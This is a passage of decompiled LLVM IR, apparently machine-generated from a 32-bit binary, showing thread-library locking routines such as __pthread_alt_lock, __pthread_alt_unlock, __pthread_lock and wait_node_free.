  %v3_8057976 = icmp eq i1 %v10_8057973, %v8_8057973
  %v4_8057976 = icmp eq i1 %v9_8057973, false
  %v5_8057976 = and i1 %v4_8057976, %v3_8057976
  br i1 %v5_8057976, label %dec_label_pc_8057980, label %dec_label_pc_8057978

dec_label_pc_8057978:                             ; preds = %dec_label_pc_8057973
  %v1_8057978 = call i32 @sched_yield(i32 %v0_8057969)
  %v0_805797d = load i32, i32* @esi, align 4
  %v1_805797d = add i32 %v0_805797d, 1
  store i32 %v1_805797d, i32* @esi, align 4
  br label %dec_label_pc_80579a3.backedge

dec_label_pc_8057980:                             ; preds = %dec_label_pc_8057973
  store i32 0, i32* %stack_var_-16, align 4
  store i32 0, i32* @esi, align 4
  %v2_805799b = call i32 @nanosleep(i32 %v2_8057996, i32 0)
  br label %dec_label_pc_80579a3.backedge

dec_label_pc_80579a3.backedge:                    ; preds = %dec_label_pc_8057980, %dec_label_pc_8057978
  %v0_80579a8.pre = load i32, i32* @ebx, align 4
  %v1_80579a8 = inttoptr i32 %v0_80579a8.pre to i32*
  %v2_80579a8 = load i32, i32* %v1_80579a8, align 4
  store i32 1, i32* %v1_80579a8, align 4
  %v1_80579aa = icmp eq i32 %v2_80579a8, 0
  %v1_80579ac = icmp eq i1 %v1_80579aa, false
  br i1 %v1_80579ac, label %dec_label_pc_8057973, label %dec_label_pc_80579ae

dec_label_pc_80579ae:                             ; preds = %dec_label_pc_80579a3.backedge, %entry
  %v2_80579a8.lcssa = phi i32 [ %v2_80579a812, %entry ], [ %v2_80579a8, %dec_label_pc_80579a3.backedge ]
  store i32 %v0_8057969, i32* @ebx, align 4
  store i32 %v0_8057968, i32* @esi, align 4
  ret i32 %v2_80579a8.lcssa

; uselistorder directives
  uselistorder i32 %v1_8057973, { 1, 0 }
  uselistorder label %dec_label_pc_8057973, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_80579b4 = load i32, i32* @ebx, align 4
  %v0_80579b5 = load i32, i32* @eax, align 4
  store i32 %v0_80579b5, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8078e68.654 to i32), i32* @eax, align 4
  %v1_80579bf = call i32 @__pthread_acquire(i32 %v0_80579b4)
  %v0_80579c4 = load i32, i32* @global_var_8078e64.655, align 4
  %v1_80579c9 = load i32, i32* @ebx, align 4
  %v2_80579c9 = inttoptr i32 %v1_80579c9 to i32*
  store i32 %v0_80579c4, i32* %v2_80579c9, align 4
  %v0_80579cb = load i32, i32* @ebx, align 4
  store i32 %v0_80579cb, i32* @global_var_8078e64.655, align 4
  store i32 0, i32* @global_var_8078e68.654, align 8
  ret i32 %v0_80579c4
}

define i32 @restart.3() local_unnamed_addr {
entry:
  %v0_80579e2 = load i32, i32* @eax, align 4
  %v1_80579e3 = call i32 @__pthread_restart_new(i32 %v0_80579e2)
  ret i32 %v1_80579e3
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80579ec = load i32, i32* @ebp, align 4
  %v0_80579ed = load i32, i32* @edi, align 4
  %v0_80579ee = load i32, i32* @esi, align 4
  %v0_80579ef = load i32, i32* @ebx, align 4
  store i32 %v0_80579ef, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_80579f7

dec_label_pc_80579f7:                             ; preds = %dec_label_pc_80579f7.backedge, %entry
  %v24_8057a02 = phi i32 [ %v0_80579f7.pre, %dec_label_pc_80579f7.backedge ], [ %tmp10, %entry ]
  %v1_80579f7 = inttoptr i32 %v24_8057a02 to i32*
  %v2_80579f7 = load i32, i32* %v1_80579f7, align 4
  store i32 %v2_80579f7, i32* %edx.global-to-local, align 4
  %tmp50 = or i32 %v2_80579f7, 1
  %tmp51 = icmp eq i32 %tmp50, 1
  br i1 %tmp51, label %dec_label_pc_80579fe, label %dec_label_pc_8057a12

dec_label_pc_80579fe:                             ; preds = %dec_label_pc_80579f7
  store i32 0, i32* @ecx, align 4
  %v2_8057a02 = load i32, i32* %v1_80579f7, align 4
  %v15_8057a02 = icmp eq i32 %v2_80579f7, %v2_8057a02
  %v22_8057a02 = select i1 %v15_8057a02, i32 0, i32 %v2_8057a02
  store i32 %v22_8057a02, i32* %v1_80579f7, align 4
  %v1_8057a06 = zext i1 %v15_8057a02 to i32
  %v2_8057a06 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057a06 = and i32 %v2_8057a06, -256
  %v4_8057a06 = or i32 %v3_8057a06, %v1_8057a06
  store i32 %v4_8057a06, i32* %edx.global-to-local, align 4
  %v4_8057a09 = icmp eq i1 %v15_8057a02, false
  br i1 %v4_8057a09, label %dec_label_pc_80579f7.backedge, label %dec_label_pc_8057a92.loopexit

dec_label_pc_80579f7.backedge:                    ; preds = %dec_label_pc_80579fe, %dec_label_pc_8057a64, %dec_label_pc_8057a6e
  %v0_80579f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80579f7

dec_label_pc_8057a12:                             ; preds = %dec_label_pc_80579f7
  %v9_80579f9 = icmp eq i32 %v2_80579f7, 1
  store i32 %v2_80579f7, i32* @ebx, align 4
  store i32 %v24_8057a02, i32* @ebp, align 4
  store i32 %v2_80579f7, i32* @edi, align 4
  store i32 %v24_8057a02, i32* %stack_var_-28, align 4
  %v1_8057a622638 = icmp eq i1 %v9_80579f9, false
  br i1 %v1_8057a622638, label %dec_label_pc_8057a25.lr.ph, label %dec_label_pc_8057a64

dec_label_pc_8057a25:                             ; preds = %dec_label_pc_8057a25.lr.ph, %dec_label_pc_8057a2b
  %v0_8057a5b29 = phi i32 [ %v0_8057a5f341, %dec_label_pc_8057a25.lr.ph ], [ %v2_8057a3d, %dec_label_pc_8057a2b ]
  %v0_8057a5428 = phi i32 [ %v0_8057a2d540, %dec_label_pc_8057a25.lr.ph ], [ %v0_8057a3d, %dec_label_pc_8057a2b ]
  %v0_8057a2f27 = phi i32 [ %v0_8057a2f639, %dec_label_pc_8057a25.lr.ph ], [ %v1_8057a40, %dec_label_pc_8057a2b ]
  %v1_8057a25 = add i32 %v0_8057a5b29, 8
  %v2_8057a25 = inttoptr i32 %v1_8057a25 to i32*
  %v3_8057a25 = load i32, i32* %v2_8057a25, align 4
  %v4_8057a25 = icmp eq i32 %v3_8057a25, 0
  br i1 %v4_8057a25, label %dec_label_pc_8057a46, label %dec_label_pc_8057a2b

dec_label_pc_8057a2b:                             ; preds = %dec_label_pc_8057a25
  store i32 %v0_8057a5b29, i32* @ecx, align 4
  store i32 %v0_8057a5428, i32* @edx, align 4
  store i32 %v0_8057a2f27, i32* @eax, align 4
  %v0_8057a31 = call i32 @wait_node_dequeue()
  %v0_8057a36 = load i32, i32* @ebx, align 4
  store i32 %v0_8057a36, i32* @eax, align 4
  %v0_8057a38 = call i32 @wait_node_free()
  %v0_8057a3d = load i32, i32* @ebp, align 4
  %v1_8057a3d = inttoptr i32 %v0_8057a3d to i32*
  %v2_8057a3d = load i32, i32* %v1_8057a3d, align 4
  store i32 %v2_8057a3d, i32* @ebx, align 4
  %v1_8057a40 = load i32, i32* @esi, align 4
  %v9_8057a5f = icmp eq i32 %v2_8057a3d, 1
  %v1_8057a62 = icmp eq i1 %v9_8057a5f, false
  br i1 %v1_8057a62, label %dec_label_pc_8057a25, label %dec_label_pc_8057a64

dec_label_pc_8057a46:                             ; preds = %dec_label_pc_8057a25
  %v1_8057a46 = add i32 %v0_8057a5b29, 4
  %v2_8057a46 = inttoptr i32 %v1_8057a46 to i32*
  %v3_8057a46 = load i32, i32* %v2_8057a46, align 4
  %v1_8057a49 = add i32 %v3_8057a46, 24
  %v2_8057a49 = inttoptr i32 %v1_8057a49 to i32*
  %v3_8057a49 = load i32, i32* %v2_8057a49, align 4
  %v5_8057a50 = icmp slt i32 %v3_8057a49, %stack_var_-24.1.ph42
  br i1 %v5_8057a50, label %dec_label_pc_8057a5b, label %dec_label_pc_8057a52

dec_label_pc_8057a52:                             ; preds = %dec_label_pc_8057a46
  store i32 %v0_8057a5b29, i32* @edi, align 4
  store i32 %v0_8057a5428, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8057a5b

dec_label_pc_8057a5b:                             ; preds = %dec_label_pc_8057a46, %dec_label_pc_8057a52
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph42, %dec_label_pc_8057a46 ], [ %v3_8057a49, %dec_label_pc_8057a52 ]
  store i32 %v0_8057a5b29, i32* @ebp, align 4
  %v1_8057a5d = inttoptr i32 %v0_8057a5b29 to i32*
  %v2_8057a5d = load i32, i32* %v1_8057a5d, align 4
  store i32 %v2_8057a5d, i32* @ebx, align 4
  %v9_8057a5f25 = icmp eq i32 %v2_8057a5d, 1
  %v1_8057a6226 = icmp eq i1 %v9_8057a5f25, false
  br i1 %v1_8057a6226, label %dec_label_pc_8057a25.lr.ph, label %dec_label_pc_8057a64

dec_label_pc_8057a25.lr.ph:                       ; preds = %dec_label_pc_8057a12, %dec_label_pc_8057a5b
  %stack_var_-24.1.ph42 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8057a5b ], [ -2147483648, %dec_label_pc_8057a12 ]
  %v0_8057a5f341 = phi i32 [ %v2_8057a5d, %dec_label_pc_8057a5b ], [ %v2_80579f7, %dec_label_pc_8057a12 ]
  %v0_8057a2d540 = phi i32 [ %v0_8057a5b29, %dec_label_pc_8057a5b ], [ %v24_8057a02, %dec_label_pc_8057a12 ]
  %v0_8057a2f639 = phi i32 [ %v0_8057a2f27, %dec_label_pc_8057a5b ], [ %v24_8057a02, %dec_label_pc_8057a12 ]
  br label %dec_label_pc_8057a25

dec_label_pc_8057a64:                             ; preds = %dec_label_pc_8057a2b, %dec_label_pc_8057a12, %dec_label_pc_8057a5b
  %stack_var_-24.1.ph.lcssa = phi i32 [ -2147483648, %dec_label_pc_8057a12 ], [ %stack_var_-24.0, %dec_label_pc_8057a5b ], [ %stack_var_-24.1.ph42, %dec_label_pc_8057a2b ]
  %v0_8057a5b.lcssa = phi i32 [ %v2_80579f7, %dec_label_pc_8057a12 ], [ %v2_8057a5d, %dec_label_pc_8057a5b ], [ %v2_8057a3d, %dec_label_pc_8057a2b ]
  %v8_8057a64 = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_8057a64, label %dec_label_pc_80579f7.backedge, label %dec_label_pc_8057a6e

dec_label_pc_8057a6e:                             ; preds = %dec_label_pc_8057a64
  %v0_8057a70 = load i32, i32* @edi, align 4
  %v1_8057a70 = add i32 %v0_8057a70, 8
  %v2_8057a70 = inttoptr i32 %v1_8057a70 to i32*
  %v3_8057a70 = load i32, i32* %v2_8057a70, align 4
  store i32 %v0_8057a5b.lcssa, i32* %v2_8057a70, align 4
  %v1_8057a73 = icmp eq i32 %v3_8057a70, 0
  %v1_8057a75 = icmp eq i1 %v1_8057a73, false
  br i1 %v1_8057a75, label %dec_label_pc_80579f7.backedge, label %dec_label_pc_8057a77

dec_label_pc_8057a77:                             ; preds = %dec_label_pc_8057a6e
  %v0_8057a77 = load i32, i32* @esi, align 4
  store i32 %v0_8057a77, i32* @eax, align 4
  %v0_8057a79 = load i32, i32* @edi, align 4
  store i32 %v0_8057a79, i32* @ecx, align 4
  %v2_8057a7b = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_8057a7b, i32* @edx, align 4
  %v0_8057a7e = call i32 @wait_node_dequeue()
  %v0_8057a83 = load i32, i32* @edi, align 4
  %v1_8057a83 = add i32 %v0_8057a83, 4
  %v2_8057a83 = inttoptr i32 %v1_8057a83 to i32*
  %v3_8057a83 = load i32, i32* %v2_8057a83, align 4
  store i32 %v3_8057a83, i32* @eax, align 4
  %v2_8057a89 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057a89, i32* @ebx, align 4
  %v0_8057a8d = call i32 @restart.3()
  br label %dec_label_pc_8057a92

dec_label_pc_8057a92.loopexit:                    ; preds = %dec_label_pc_80579fe
  br label %dec_label_pc_8057a92

dec_label_pc_8057a92:                             ; preds = %dec_label_pc_8057a92.loopexit, %dec_label_pc_8057a77
  %v0_8057a99 = phi i32 [ %v2_80579f7, %dec_label_pc_8057a92.loopexit ], [ %v0_8057a8d, %dec_label_pc_8057a77 ]
  store i32 %v0_80579ee, i32* @esi, align 4
  store i32 %v0_80579ed, i32* @edi, align 4
  store i32 %v0_80579ec, i32* @ebp, align 4
  ret i32 %v0_8057a99

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph42, { 0, 2, 1 }
  uselistorder i32 %v2_8057a3d, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8057a3d, { 1, 0 }
  uselistorder i32 %v0_8057a5b29, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i1 %v15_8057a02, { 1, 2, 0 }
  uselistorder i32 %v2_8057a02, { 1, 0 }
  uselistorder i32 %v2_80579f7, { 2, 0, 1, 7, 6, 4, 5, 3, 8 }
  uselistorder i32 %v24_8057a02, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_8057a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057a25.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8057a5b, { 1, 0 }
  uselistorder label %dec_label_pc_80579f7.backedge, { 2, 1, 0 }
}

define i32 @thread_self.4() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8057aa1 = load i32, i32* @esp, align 4
  %v1_8057aa1 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_8057aa1 = icmp ult i32 %v0_8057aa1, %v1_8057aa1
  %v1_8057aa7 = icmp eq i1 %v7_8057aa1, false
  br i1 %v1_8057aa7, label %dec_label_pc_8057ad8, label %dec_label_pc_8057aa9

dec_label_pc_8057aa9:                             ; preds = %entry
  %v1_8057aa9 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_8057aa9 = icmp ult i32 %v0_8057aa1, %v1_8057aa9
  br i1 %v7_8057aa9, label %dec_label_pc_8057abe, label %dec_label_pc_8057ab1

dec_label_pc_8057ab1:                             ; preds = %dec_label_pc_8057aa9
  %v1_8057ab6 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_8057ab6 = icmp ult i32 %v0_8057aa1, %v1_8057ab6
  br i1 %v7_8057ab6, label %dec_label_pc_8057ad8, label %dec_label_pc_8057abe

dec_label_pc_8057abe:                             ; preds = %dec_label_pc_8057ab1, %dec_label_pc_8057aa9
  %v0_8057abe = load i32, i32* @global_var_807e578.619, align 8
  %v1_8057abe = icmp eq i32 %v0_8057abe, 0
  br i1 %v1_8057abe, label %dec_label_pc_8057acc, label %dec_label_pc_8057ac7

dec_label_pc_8057ac7:                             ; preds = %dec_label_pc_8057abe
  %v0_8057ac7 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057acc

dec_label_pc_8057acc:                             ; preds = %dec_label_pc_8057abe, %dec_label_pc_8057ac7
  %v2_8057ad2 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8057ad8

dec_label_pc_8057ad8:                             ; preds = %dec_label_pc_8057ab1, %entry, %dec_label_pc_8057acc
  %v0_8057ad8 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_8057ab1 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_8057ad2, %dec_label_pc_8057acc ]
  ret i32 %v0_8057ad8

; uselistorder directives
  uselistorder label %dec_label_pc_8057ad8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057acc, { 1, 0 }
}

define i32 @suspend.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8057adc = load i32, i32* @eax, align 4
  %v1_8057add = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8057adc)
  ret i32 %v1_8057add
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8057ae6 = load i32, i32* @esi, align 4
  %v0_8057ae7 = load i32, i32* @ebx, align 4
  store i32 %v0_8057ae7, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8057b0d = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8057af3

dec_label_pc_8057af3:                             ; preds = %dec_label_pc_8057b11.dec_label_pc_8057af3_crit_edge, %entry
  %v0_8057af3 = phi i32 [ %v0_8057af3.pre, %dec_label_pc_8057b11.dec_label_pc_8057af3_crit_edge ], [ %tmp9, %entry ]
  %v1_8057af3 = inttoptr i32 %v0_8057af3 to i32*
  %v2_8057af3 = load i32, i32* %v1_8057af3, align 4
  store i32 %v2_8057af3, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_8057afa = icmp eq i32 %v2_8057af3, 0
  br i1 %v1_8057afa, label %dec_label_pc_8057b11, label %dec_label_pc_8057afe

dec_label_pc_8057afe:                             ; preds = %dec_label_pc_8057af3
  %v0_8057afe = load i32, i32* %edx.global-to-local, align 4
  %v1_8057afe = icmp eq i32 %v0_8057afe, 0
  %v1_8057b00 = icmp eq i1 %v1_8057afe, false
  br i1 %v1_8057b00, label %dec_label_pc_8057b09, label %dec_label_pc_8057b02

dec_label_pc_8057b02:                             ; preds = %dec_label_pc_8057afe
  %v0_8057b02 = call i32 @thread_self.4()
  store i32 %v0_8057b02, i32* %edx.global-to-local, align 4
  %v0_8057b1f.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057b09

dec_label_pc_8057b09:                             ; preds = %dec_label_pc_8057afe, %dec_label_pc_8057b02
  %v0_8057b1f.pre = phi i32 [ %v0_8057af3, %dec_label_pc_8057afe ], [ %v0_8057b1f.pre.pre, %dec_label_pc_8057b02 ]
  store i32 %v2_8057b0d, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8057b11

dec_label_pc_8057b11:                             ; preds = %dec_label_pc_8057af3, %dec_label_pc_8057b09
  %v3_8057b1f = phi i32 [ 1, %dec_label_pc_8057af3 ], [ %v2_8057b0d, %dec_label_pc_8057b09 ]
  %v24_8057b1f = phi i32 [ %v0_8057af3, %dec_label_pc_8057af3 ], [ %v0_8057b1f.pre, %dec_label_pc_8057b09 ]
  store i32 %v2_8057af3, i32* %stack_var_-20, align 4
  %v1_8057b1f = inttoptr i32 %v24_8057b1f to i32*
  %v2_8057b1f = load i32, i32* %v1_8057b1f, align 4
  %v15_8057b1f = icmp eq i32 %v2_8057af3, %v2_8057b1f
  %v22_8057b1f = select i1 %v15_8057b1f, i32 %v3_8057b1f, i32 %v2_8057b1f
  store i32 %v22_8057b1f, i32* %v1_8057b1f, align 4
  %v1_8057b23 = zext i1 %v15_8057b1f to i32
  %v2_8057b23 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8057b23 = and i32 %v2_8057b23, -256
  %v4_8057b23 = or i32 %v3_8057b23, %v1_8057b23
  store i32 %v4_8057b23, i32* @ecx, align 4
  %v4_8057b26 = icmp eq i1 %v15_8057b1f, false
  br i1 %v4_8057b26, label %dec_label_pc_8057b11.dec_label_pc_8057af3_crit_edge, label %dec_label_pc_8057b2a

dec_label_pc_8057b11.dec_label_pc_8057af3_crit_edge: ; preds = %dec_label_pc_8057b11
  %v0_8057af3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057af3

dec_label_pc_8057b2a:                             ; preds = %dec_label_pc_8057b11
  br i1 %v1_8057afa, label %dec_label_pc_8057b35, label %dec_label_pc_8057b2e

dec_label_pc_8057b2e:                             ; preds = %dec_label_pc_8057b2a
  %v0_8057b2e = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8057b2e, i32* @eax, align 4
  %v0_8057b30 = load i32, i32* %stack_var_-20, align 4
  %v2_8057b30 = call i32 @suspend.5(i32 %v0_8057b30, i32 0)
  br label %dec_label_pc_8057b35

dec_label_pc_8057b35:                             ; preds = %dec_label_pc_8057b2a, %dec_label_pc_8057b2e
  %v0_8057b3a = phi i32 [ 0, %dec_label_pc_8057b2a ], [ %v2_8057b30, %dec_label_pc_8057b2e ]
  %v2_8057b38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8057b38, i32* @ebx, align 4
  store i32 %v0_8057ae6, i32* @esi, align 4
  ret i32 %v0_8057b3a

; uselistorder directives
  uselistorder i1 %v15_8057b1f, { 1, 2, 0 }
  uselistorder i32 %v2_8057b1f, { 1, 0 }
  uselistorder i32 %v0_8057af3, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057b35, { 1, 0 }
  uselistorder label %dec_label_pc_8057b11, { 1, 0 }
  uselistorder label %dec_label_pc_8057b09, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_8057b3c = load i32, i32* @edi, align 4
  %v0_8057b3d = load i32, i32* @esi, align 4
  %v0_8057b3e = load i32, i32* @ebx, align 4
  %v0_8057b42 = load i32, i32* @eax, align 4
  store i32 %v0_8057b42, i32* @ebx, align 4
  %v0_8057b44 = load i32, i32* @edx, align 4
  store i32 %v0_8057b44, i32* @edi, align 4
  %v1_8057b46 = inttoptr i32 %v0_8057b42 to i32*
  %v2_8057b46 = load i32, i32* %v1_8057b46, align 4
  %v3_8057b46 = icmp eq i32 %v2_8057b46, 0
  %v1_8057b49 = icmp eq i1 %v3_8057b46, false
  br i1 %v1_8057b49, label %dec_label_pc_8057b5f, label %dec_label_pc_8057b4b

dec_label_pc_8057b4b:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 1, i32* @ecx, align 4
  %v2_8057b54 = load i32, i32* %v1_8057b46, align 4
  %v15_8057b54 = icmp eq i32 %v2_8057b54, 0
  %v22_8057b54 = select i1 %v15_8057b54, i32 1, i32 %v2_8057b54
  store i32 %v22_8057b54, i32* %v1_8057b46, align 4
  %v1_8057b58 = zext i1 %v15_8057b54 to i32
  %v2_8057b58 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057b58 = and i32 %v2_8057b58, -256
  %v4_8057b58 = or i32 %v3_8057b58, %v1_8057b58
  store i32 %v4_8057b58, i32* @edx, align 4
  %v4_8057b5b = icmp eq i1 %v15_8057b54, false
  %v1_8057b5d = icmp eq i1 %v4_8057b5b, false
  br i1 %v1_8057b5d, label %dec_label_pc_8057bbe, label %dec_label_pc_8057b5f

dec_label_pc_8057b5f:                             ; preds = %dec_label_pc_8057b4b, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8057b61

dec_label_pc_8057b61:                             ; preds = %dec_label_pc_8057b90, %dec_label_pc_8057bae, %dec_label_pc_8057ba1.preheader, %dec_label_pc_8057b5f
  %v0_8057b61 = load i32, i32* @ebx, align 4
  %v1_8057b61 = inttoptr i32 %v0_8057b61 to i32*
  %v2_8057b61 = load i32, i32* %v1_8057b61, align 4
  store i32 %v2_8057b61, i32* @esi, align 4
  %v1_8057b63 = urem i32 %v2_8057b61, 2
  %v2_8057b63 = icmp eq i32 %v1_8057b63, 0
  %v1_8057b69 = icmp eq i1 %v2_8057b63, false
  br i1 %v1_8057b69, label %dec_label_pc_8057b77, label %dec_label_pc_8057b6b

dec_label_pc_8057b6b:                             ; preds = %dec_label_pc_8057b61
  store i32 %v2_8057b61, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v0_8057b89.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057b89

dec_label_pc_8057b77:                             ; preds = %dec_label_pc_8057b61
  %v0_8057b77 = load i32, i32* @edi, align 4
  %v1_8057b77 = icmp eq i32 %v0_8057b77, 0
  %v1_8057b79 = icmp eq i1 %v1_8057b77, false
  br i1 %v1_8057b79, label %dec_label_pc_8057b82, label %dec_label_pc_8057b7b

dec_label_pc_8057b7b:                             ; preds = %dec_label_pc_8057b77
  %v0_8057b7b = call i32 @thread_self.4()
  store i32 %v0_8057b7b, i32* @edi, align 4
  br label %dec_label_pc_8057b82

dec_label_pc_8057b82:                             ; preds = %dec_label_pc_8057b77, %dec_label_pc_8057b7b
  %v0_8057b82 = phi i32 [ %v0_8057b77, %dec_label_pc_8057b77 ], [ %v0_8057b7b, %dec_label_pc_8057b7b ]
  store i32 %v0_8057b82, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8057b89

dec_label_pc_8057b89:                             ; preds = %dec_label_pc_8057b6b, %dec_label_pc_8057b82
  %v1_8057b8d = phi i32 [ %v0_8057b89.pre, %dec_label_pc_8057b6b ], [ %v0_8057b82, %dec_label_pc_8057b82 ]
  %v0_8057b6b.sink = phi i32 [ %v2_8057b61, %dec_label_pc_8057b6b ], [ %v0_8057b82, %dec_label_pc_8057b82 ]
  %v1_8057b72 = or i32 %v0_8057b6b.sink, 1
  store i32 %v1_8057b72, i32* %ecx.global-to-local, align 4
  %v1_8057b89 = icmp eq i32 %v1_8057b8d, 0
  br i1 %v1_8057b89, label %dec_label_pc_8057b90, label %dec_label_pc_8057b8d

dec_label_pc_8057b8d:                             ; preds = %dec_label_pc_8057b89
  %v0_8057b8d = load i32, i32* @esi, align 4
  %v2_8057b8d = add i32 %v1_8057b8d, 12
  %v3_8057b8d = inttoptr i32 %v2_8057b8d to i32*
  store i32 %v0_8057b8d, i32* %v3_8057b8d, align 4
  %v3_8057b92.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8057b90

dec_label_pc_8057b90:                             ; preds = %dec_label_pc_8057b89, %dec_label_pc_8057b8d
  %v3_8057b92 = phi i32 [ %v1_8057b72, %dec_label_pc_8057b89 ], [ %v3_8057b92.pre, %dec_label_pc_8057b8d ]
  %v0_8057b90 = load i32, i32* @esi, align 4
  %v0_8057b92 = load i32, i32* @ebx, align 4
  %v1_8057b92 = inttoptr i32 %v0_8057b92 to i32*
  %v2_8057b92 = load i32, i32* %v1_8057b92, align 4
  %v15_8057b92 = icmp eq i32 %v0_8057b90, %v2_8057b92
  %v22_8057b92 = select i1 %v15_8057b92, i32 %v3_8057b92, i32 %v2_8057b92
  store i32 %v22_8057b92, i32* %v1_8057b92, align 4
  %v1_8057b96 = zext i1 %v15_8057b92 to i32
  %v2_8057b96 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8057b96 = and i32 %v2_8057b96, -256
  %v4_8057b96 = or i32 %v3_8057b96, %v1_8057b96
  store i32 %v4_8057b96, i32* @ecx, align 4
  %v4_8057b99 = icmp eq i1 %v15_8057b92, false
  br i1 %v4_8057b99, label %dec_label_pc_8057b61, label %dec_label_pc_8057b9d

dec_label_pc_8057b9d:                             ; preds = %dec_label_pc_8057b90
  %v0_8057b9d = load i32, i32* @edx, align 4
  %v1_8057b9d = icmp eq i32 %v0_8057b9d, 0
  %v1_8057b9f = icmp eq i1 %v1_8057b9d, false
  br i1 %v1_8057b9f, label %dec_label_pc_8057bb8.preheader, label %dec_label_pc_8057ba1.preheader

dec_label_pc_8057bb8.preheader:                   ; preds = %dec_label_pc_8057b9d
  %v0_8057bb814 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057bb815 = add i32 %v0_8057bb814, -1
  store i32 %v1_8057bb815, i32* %ebp.global-to-local, align 4
  %v10_8057bb921 = icmp eq i32 %v0_8057bb814, 0
  %v1_8057bbc22 = icmp eq i1 %v10_8057bb921, false
  br i1 %v1_8057bbc22, label %dec_label_pc_8057bb1, label %dec_label_pc_8057bbe

dec_label_pc_8057ba1.preheader:                   ; preds = %dec_label_pc_8057b9d
  %v0_8057ba1.pre = load i32, i32* @edi, align 4
  store i32 %v0_8057ba1.pre, i32* @eax, align 4
  %v2_8057ba323 = call i32 @suspend.5(i32 %v0_8057b3e, i32 %v0_8057b3d)
  %v0_8057ba824 = load i32, i32* @edi, align 4
  %v1_8057ba825 = add i32 %v0_8057ba824, 12
  %v2_8057ba826 = inttoptr i32 %v1_8057ba825 to i32*
  %v3_8057ba827 = load i32, i32* %v2_8057ba826, align 4
  %v4_8057ba828 = icmp eq i32 %v3_8057ba827, 0
  br i1 %v4_8057ba828, label %dec_label_pc_8057b61, label %dec_label_pc_8057bae

dec_label_pc_8057bae:                             ; preds = %dec_label_pc_8057ba1.preheader, %dec_label_pc_8057bae
  %v0_8057ba829 = phi i32 [ %v0_8057ba8, %dec_label_pc_8057bae ], [ %v0_8057ba824, %dec_label_pc_8057ba1.preheader ]
  %v0_8057bae = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057bae = add i32 %v0_8057bae, 1
  store i32 %v1_8057bae, i32* %ebp.global-to-local, align 4
  store i32 %v0_8057ba829, i32* @eax, align 4
  %v2_8057ba3 = call i32 @suspend.5(i32 %v0_8057b3e, i32 %v0_8057b3d)
  %v0_8057ba8 = load i32, i32* @edi, align 4
  %v1_8057ba8 = add i32 %v0_8057ba8, 12
  %v2_8057ba8 = inttoptr i32 %v1_8057ba8 to i32*
  %v3_8057ba8 = load i32, i32* %v2_8057ba8, align 4
  %v4_8057ba8 = icmp eq i32 %v3_8057ba8, 0
